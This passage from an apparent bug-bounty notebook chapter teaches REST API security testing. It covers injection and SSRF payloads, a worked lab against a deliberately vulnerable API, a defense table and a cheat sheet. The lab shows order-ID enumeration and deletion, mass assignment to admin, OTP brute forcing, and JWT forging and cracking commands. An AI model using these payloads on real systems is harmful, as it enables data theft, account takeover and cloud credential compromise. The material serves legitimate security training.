### Pagination, filtering & search-parameter abuse

List endpoints (`GET /v1/users?limit=20&offset=0`) hide two recurring bugs:

- **Unbounded page size:** set `?limit=1000000` (or `?page_size=-1`, `?per_page=all`). If the server honors it, you dump the entire table in one call — a scraping/DoS primitive *and* often an excessive-data-exposure leak. Many APIs cap the *UI* value but not the raw parameter.
- **Filter/sort injection & authZ bypass:** `?filter[owner_id]=991`, `?where=role:admin`, `?sort=password`, `?fields=email,ssn`. A filter that trusts your input can return other tenants' rows (BOLA at the collection level) or over-expose columns you asked for by name. GraphQL-style `?include=`/`?expand=` on REST commonly walks relationships past the authorization boundary.
- **Offset enumeration:** even with per-object authZ, an unfiltered `offset` walk over a shared list can leak *existence* and *counts* of other tenants' objects.

```bash
# dump everything: over-large limit + field selection
curl -s "https://api.shop.com/v1/users?limit=9999999&fields=id,email,phone,role" \
  -H "Authorization: Bearer $A" | jq 'length'
# 48213   <- whole user table returned to a normal user
```

Always test the *raw* pagination/filter parameters, not the values the UI offers — the UI's dropdown of "10 / 25 / 50" says nothing about what the endpoint accepts.

### Sensitive business-flow abuse (API6)

API6 is about automating a legitimate flow the business assumed only happens at human speed: buying limited-stock items (scalping), redeeming a "one per customer" coupon many times, mass-creating accounts for referral bonuses, or draining an inventory. There is no single payload — you reason about the *business rule* and find where it isn't enforced server-side.

**Worked example — coupon reuse via race condition (also relevant to the earlier race-conditions chapter):** a "10% off, one use" coupon that checks `used == false` then sets `used = true` non-atomically can be redeemed many times by firing concurrent requests before the flag flips. Send 30 parallel `POST /v1/cart/apply-coupon` and watch multiple succeed. **Bug-bounty note:** business-logic and race-condition abuse is under-automated and therefore under-competed — high-value findings hide here precisely because scanners can't understand intent.

```mermaid
sequenceDiagram
    participant A as Attacker (30 parallel reqs)
    participant S as API server
    participant D as DB (coupon.used)
    A->>S: POST apply-coupon (x30 simultaneously)
    S->>D: read used == false  (all 30 read before any write)
    D-->>S: false (x30)
    S->>D: set used = true (x30)
    S-->>A: 200 discount applied (x30)  (one-use coupon used 30 times)
```

---

## Part 10: Injection, SSRF & Misconfiguration on APIs (API7, API8, API10)

The classic web vulns still apply — the *contexts* just change to JSON/API.

### Injection in an API context

- **SQL injection** — probe JSON string values, not just query params: `{"search":"' OR '1'='1"}`, `{"id":"1 OR 1=1"}`. Numeric contexts (`{"id":1 OR 1=1}`) and `ORDER BY`/`sort` params (`?sort=name;--`) are common. Point sqlmap at a saved request: `sqlmap -r request.txt --batch`.
- **NoSQL injection** — MongoDB-backed APIs accept operator objects: `{"username":{"$ne":null},"password":{"$ne":null}}` can bypass login; `{"$gt":""}` and `{"$regex":"^a"}` enable auth bypass and blind extraction.
- **Command / SSTI / XXE** — anywhere the API renders templates, executes, or parses XML. Switch `Content-Type` to `application/xml` on a JSON endpoint and send an XXE payload — some backends parse both.

```json
{"$where": "sleep(5000)"}
{"filter": {"role": {"$ne": "x"}}}
```

The first is a NoSQL time-based probe (Mongo); the second is NoSQL operator injection.

### HTTP parameter pollution & JSON structural tricks

APIs parse structured input, and parsers disagree — that gap is an attack surface:

- **Duplicate parameters (HPP):** send `?role=user&role=admin` or a JSON body with two `"role"` keys. Different layers (WAF, framework, backend) pick *different* occurrences — the WAF sees `user`, the app sees `admin`. Test first-wins vs last-wins behavior on every filter you meet.
- **Type juggling:** send `{"id": "1"}` vs `{"id": 1}` vs `{"id": [1]}` vs `{"id": {"$gt":0}}`. Loosely-typed backends (PHP `==`, Mongo) treat these differently; an array or object where a scalar is expected can bypass comparisons or crash into a verbose `500`.
- **JSON key case / unicode:** `{"Role":"admin"}`, `{"ROLE":"admin"}`, or a homoglyph key sometimes hits a case-insensitive binder the allow-list missed.
- **Nested/wrapper injection:** wrap the object — `{"user":{"role":"admin"}}` — when the flat `{"role":"admin"}` is filtered; frameworks that deep-merge will still apply it.
- **Content-type confusion:** re-send a JSON request as `application/x-www-form-urlencoded` (`role=admin&user_id=1`) or `multipart/form-data`. A different, laxer parser may accept fields the JSON validator rejected.

These structural mutations are what turn a "patched" mass-assignment or filter into a live bug; always try them before concluding an endpoint is safe.

### SSRF via APIs (API7)

APIs that fetch a URL you provide — webhook registration, "import from URL", avatar-by-URL, PDF-from-URL — are SSRF-prone. Point them at internal targets:

```http
POST /v1/import HTTP/1.1
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Hitting the cloud metadata endpoint (`169.254.169.254`) can dump IAM credentials — a full cloud compromise. (This chains directly into the SSRF material from the previous notebook; the API is just the delivery vector.) Try `http://localhost:port`, `http://[::1]`, and DNS-rebinding/redirect bypasses if a filter blocks obvious internals.

### Security misconfiguration (API8) & unsafe consumption (API10)

- **Verbose errors** — force a `500` (send a string where an int is expected, break the JSON) and read the stack trace for framework versions, file paths, SQL fragments.
- **Missing security headers, permissive CORS** — `Access-Control-Allow-Origin: <reflected>` + `Allow-Credentials: true` lets a malicious site read authenticated responses.
- **Debug/actuator endpoints** — Spring `/actuator/env`, `/actuator/heapdump`; `/debug`; GraphQL introspection. Nuclei's `exposure` tags catch many.
- **API10** — if the target API ingests data from a *third-party* API and trusts it blindly, you may poison that upstream. Rare but high-impact.

---

## Part 11: End-to-End Worked Lab — Testing a Vulnerable REST API

Let's run the full methodology against a deliberately vulnerable API (e.g. **crAPI**, **VAmPI**, or **DVGA** for GraphQL — all free, self-hosted, lawful to attack). Assume `https://api.lab.local`. **Ethics/lawful-use:** only ever run this against systems you own or are explicitly authorized (a lab, or an in-scope bug-bounty target). Everything below is lab-scoped.

### Step 1 — Discovery

```bash
# find the docs
curl -s https://api.lab.local/openapi.json -o spec.json && jq '.paths | keys' spec.json
```

```json
[
  "/identity/api/auth/login",
  "/identity/api/v2/user/dashboard",
  "/identity/api/v2/vehicle/{vehicleId}/location",
  "/workshop/api/shop/orders/{order_id}",
  "/workshop/api/mechanic/receive_report"
]
```

The spec hands us every route and the `{order_id}` / `{vehicleId}` object IDs — prime BOLA candidates.

### Step 2 — Authentication

```bash
# register + login as attacker A
curl -s -X POST https://api.lab.local/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{"name":"A","email":"a@t.com","password":"Passw0rd!","number":"9990001111"}'

TOKEN_A=$(curl -s -X POST https://api.lab.local/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@t.com","password":"Passw0rd!"}' | jq -r .token)
echo "$TOKEN_A" | cut -d. -f2 | base64 -d 2>/dev/null   # decode JWT payload
```

```json
{"sub":"a@t.com","role":"user","iat":1710000000}
```

No `exp` claim — tokens never expire (API2 finding #1). We note it and continue.

### Step 3 — BOLA on the order endpoint

```bash
# as attacker A, walk order IDs
for id in $(seq 1 20); do
  code=$(curl -s -o /tmp/o.json -w "%{http_code}" \
    https://api.lab.local/workshop/api/shop/orders/$id \
    -H "Authorization: Bearer $TOKEN_A")
  echo "order $id -> $code $(jq -c '{email:.customer.email,total:.total}' /tmp/o.json 2>/dev/null)"
done
```

```
order 1 -> 200 {"email":"victim1@corp.com","total":4999}
order 2 -> 200 {"email":"victim2@corp.com","total":1299}
order 3 -> 200 {"email":"a@t.com","total":0}      <- our own
order 4 -> 200 {"email":"victim3@corp.com","total":8800}
```

**BOLA confirmed (API1, Critical):** attacker A reads every customer's order and email. Escalate to write:

```bash
curl -i -X DELETE https://api.lab.local/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer $TOKEN_A"
# HTTP/1.1 200 OK  -> we can delete other users' orders. Critical.
```

### Step 4 — Mass assignment on profile

```bash
curl -s -X POST https://api.lab.local/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' \
  -d '{"name":"A","role":"admin","available_credit":100000}'
# re-fetch:
curl -s https://api.lab.local/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer $TOKEN_A" | jq '{role,available_credit}'
```

```json
{"role":"admin","available_credit":100000}
```

**Mass assignment confirmed (API3, Critical):** we granted ourselves admin and credit by adding two JSON fields.

### Step 5 — Rate limit on OTP

```bash
for otp in $(seq -w 0 50); do
  curl -s -o /dev/null -w "%{http_code} " -X POST \
    https://api.lab.local/identity/api/auth/v3/check-otp \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"victim1@corp.com\",\"otp\":\"$otp\"}"
done; echo
```

```
200 200 200 200 200 ... (never a 429)
```

**No rate limiting (API4, High):** a short OTP is brute-forceable -> password reset takeover.

### Step 6 — Report

Five findings from one API in one session: BOLA (read+delete), mass assignment, no token expiry, no OTP rate limit. We write each up with the exact request, response, and impact (see Chapter 6 of this notebook for report craft). **This is a realistic bug-bounty session shape** — the money is in authorization and business logic, exactly as the OWASP list predicted.

---

## Part 12: Detection & Defense Angle

Everything above is offense; here is the consolidated defender's view — the one place this chapter boxes off a dimension, matching the reference chapters' single "Detection & Defense" section.

### Detecting API attacks (Blue Team)

- **BOLA/BFLA telemetry:** log `user_id` *and* `object_owner_id` on every object access; alert when they differ and the request still succeeded. A spike of `200`s across sequential/varied object IDs from one token is enumeration — the ffuf sweep in Part 7 looks like one identity touching hundreds of objects in seconds.
- **Enumeration signatures:** many `403/404`s then a `200`, or monotonically increasing IDs, or one IP/token hitting `/orders/{id}` across a wide range. WAFs and API gateways (Kong, Apigee, AWS API Gateway) can rate-limit and anomaly-score per token, not just per IP.
- **Auth anomalies:** tokens with no `exp`, `alg:none` in submitted JWTs, sudden `role` changes, logins from new ASNs, and OTP endpoints receiving hundreds of attempts (API4) should all fire alerts.
- **Verbose-error monitoring:** `500`s with stack traces in responses indicate both a bug and reconnaissance in progress.

### Defending APIs

| Threat | Primary defense |
|--------|-----------------|
| BOLA (API1) | Enforce ownership on *every* object access server-side (`WHERE owner_id = current_user`); never trust client IDs |
| Broken auth (API2) | Short-lived tokens with `exp`; strong signature (reject `none`); rotate keys; lock out after N failures |
| Mass assignment / exposure (API3) | Allow-list writable fields; serialize responses through explicit DTOs (deny-by-default properties) |
| No rate limit (API4/API6) | Per-user + per-endpoint quotas; CAPTCHA/step-up on sensitive flows; atomic checks for one-use logic |
| BFLA (API5) | Centralized role checks on every function; deny-by-default authorization middleware |
| SSRF (API7) | Allow-list outbound hosts; block link-local/RFC1918; no raw user URLs to fetchers |
| Misconfig (API8) | Disable debug endpoints in prod; strict CORS; generic error messages; security headers |
| Inventory (API9) | Retire old versions; API gateway inventory; kill shadow/staging hosts |

The unifying principle: **authorize every request against the specific object and function, server-side, deny-by-default.** REST's statelessness means there is no "we already checked earlier" — there is no earlier.

---

## Part 13: The Methodology on One Page

Everything above collapses into a single repeatable loop you run against every REST API. Pin this:

```mermaid
flowchart TD
    A[Scope & authorize target] --> B[Discovery: Swagger/Postman/JS/subdomains/versions]
    B --> C[Enumerate endpoints + verbs + old versions]
    C --> D[Authentication: scheme? strip token? JWT alg:none/weak/confusion? OAuth redirect_uri/state?]
    D --> E[Authorization: BOLA swap IDs / BFLA admin funcs / method override]
    E --> F[Object props: mass assignment write / excessive exposure read]
    F --> G[Abuse: rate limits / pagination / business flows / race]
    G --> H[Injection & config: SQLi/NoSQL/SSRF/CORS/verbose errors]
    H --> I[Escalate read to write; chain findings]
    I --> J[Document: request + response + impact -> report]
    J --> B
```

The loop is deliberately circular: each finding (a new endpoint, a leaked ID, an old version) feeds back into discovery. Two accounts, a proxy, and this loop is 90% of professional API testing.

## Part 14: Final Revision / Summary

- An **API** is a software contract; a **REST** API exposes **resources** at **URL endpoints**, acted on by **HTTP verbs** (`GET/POST/PUT/PATCH/DELETE`), is **stateless**, and usually speaks **JSON**. Statelessness means *every request must be independently authorized*.
- Read HTTP fluently: verbs signal intent (try the *other* verbs and override headers), and **status codes are an oracle** — especially the **403-vs-404** existence signal.
- The **OWASP API Top 10** is your coverage map; **most of it is authorization/authentication**, not injection. Internalize this reframing.
- Methodology in five phases: **Discovery** (Swagger/Postman/JS/versions — API9) → **Authentication** (schemes, JWT `alg:none`/weak-secret/confusion — API2) → **Authorization** (BOLA on object IDs, BFLA on admin functions — API1/API5) → **Object properties** (mass assignment over-write, excessive data over-read — API3) → **Abuse** (rate limits, business-flow/race — API4/API6), plus classic **injection/SSRF/misconfig** (API7/API8/API10).
- **BOLA is king:** two accounts, swap the ID, watch for `200`. A UUID is *not* an access control. Automate with Burp **Autorize** and `ffuf`.
- Tools: **curl/Postman** to craft, **Burp (Repeater/Intruder/Autorize)** to tamper, **ffuf** to fuzz endpoints/IDs, **mitmproxy** for mobile, **jwt_tool** for tokens, **Nuclei** for known exposures.
- Defense reduces to one sentence: **authorize every request against the specific object and function, server-side, deny-by-default**, with per-user rate limits and explicit field allow-lists.

## Cheat Sheet / Quick Reference

**Discovery**

```bash
# Swagger/OpenAPI hunt
for p in swagger.json openapi.json v2/api-docs api-docs swagger-ui/index.html; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" https://api.target.com/$p; done
# endpoint fuzz
ffuf -u https://api.target.com/v1/FUZZ -w seclists/.../api-endpoints.txt -mc all -fc 404 -ac
```

**Auth / JWT**

```bash
echo $JWT | cut -d. -f2 | base64 -d          # decode payload
python3 jwt_tool.py $JWT -X a                # alg:none forge
python3 jwt_tool.py $JWT -C -d rockyou.txt   # crack HMAC secret
hashcat -m 16500 jwt.txt rockyou.txt         # crack (hashcat)
```

**BOLA / BFLA**

```bash
# swap ID as attacker A
curl -s https://api.target.com/v1/orders/2001 -H "Authorization: Bearer $A"
# enumerate range
ffuf -u https://api.target.com/v1/orders/FUZZ -w <(seq 1 5000) \
  -H "Authorization: Bearer $A" -mc 200
# BFLA: hit admin routes with low-priv token; try method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" .../admin/users/5 -H "Authorization: Bearer $A"
```

**Mass assignment / exposure** — add `role`, `is_admin`, `verified`, `balance`, `user_id`, `id` to write bodies; read raw JSON for over-returned fields.

**Rate limit** — loop the request; watch for `429`; bypass with `X-Forwarded-For`, path casing/slash, version pivot.

**Common misconfig** — force `500` for stack traces; test CORS reflection; check `/actuator/*`, `/debug`, introspection.

### Common pitfalls (do not make these)

- Judging data exposure by the **UI** instead of the **raw JSON** — the leak is in fields the app hides.
- Assuming a **UUID/GUID** means "secure" — it's still BOLA if ownership isn't checked; harvest real IDs and replay.
- Testing only the **documented** endpoints — the bugs live in shadow/old-version/`internal` routes (API9).
- Only testing `GET` — `PUT/PATCH/DELETE` and **method override** headers bypass verb-based controls.
- Stopping at **read** BOLA — always try to escalate to **write/delete** for max impact.
- Forgetting to test with **two low-priv accounts** — self-to-self tests miss cross-tenant authorization flaws.
- Ignoring **`/v1/`** when the app uses `/v3/` — the old version often lacks the authorization fix.

## Practice Labs & Resources

Train each skill in this chapter on purpose-built, lawful targets:

- **PortSwigger Web Security Academy — API testing & JWT labs** (`portswigger.net/web-security/api-testing`, `/jwt`): free labs for mass assignment, hidden endpoints, server-side parameter pollution, `alg:none`, algorithm confusion, and JWT weak-secret cracking — the exact `jwt_tool` flows in Part 6.
- **crAPI (OWASP "Completely Ridiculous API")**: self-hosted deliberately-vulnerable API mirroring the API Top 10 — BOLA on vehicle location/orders, mass assignment, JWT flaws, SSRF. The Part 11 lab shape is modeled on it.
- **VAmPI**: a small Flask vulnerable API with a toggleable "vulnerable/secure" mode — perfect for seeing BOLA and broken auth appear/disappear.
- **OWASP Juice Shop**: has an API-heavy backend; good for JWT and IDOR challenges alongside classic web bugs.
- **APIsec University — "API Security Fundamentals" & "API Penetration Testing"**: free courses that pair with crAPI.
- **HackTheBox / TryHackMe** rooms tagged API (e.g. THM "Bookstore", "API" rooms) for guided BOLA/JWT practice.
- **HackerOne / Bugcrowd disclosed reports** filtered for "IDOR"/"BOLA"/"mass assignment": read real, paid findings to calibrate impact and write-ups (leads directly into Chapter 6 on reporting).

### Self-test questions

1. Given `GET /orders/1044` returns `403` while `/orders/9999999` returns `404`, what have you learned about the endpoint, and what's your next move?
2. A profile-update endpoint expects `{"name","email"}`. List five extra fields you'd inject to test mass assignment and the impact each targets.
3. An API uses `RS256` JWTs and you have the public key. Describe the algorithm-confusion attack and the `jwt_tool` flag that performs it.
4. You find an OTP-verify endpoint. Design a test to prove missing rate limiting, and name three bypasses if a limit exists.
5. The app is on `/v3/`. Why should you still test `/v1/` and `/v2/`, and which OWASP API item does that map to?

The next chapter moves from REST to **GraphQL API attacks** — introspection abuse, batching, alias-based brute force, and the authorization pitfalls unique to a single flexible query endpoint.

---

*Also on [Praneeth's portfolio](https://ping-praneeth.vercel.app/notebook/appsec-api-bugbounty/01-rest-api-security-testing-methodology), with comments and the latest edits.*
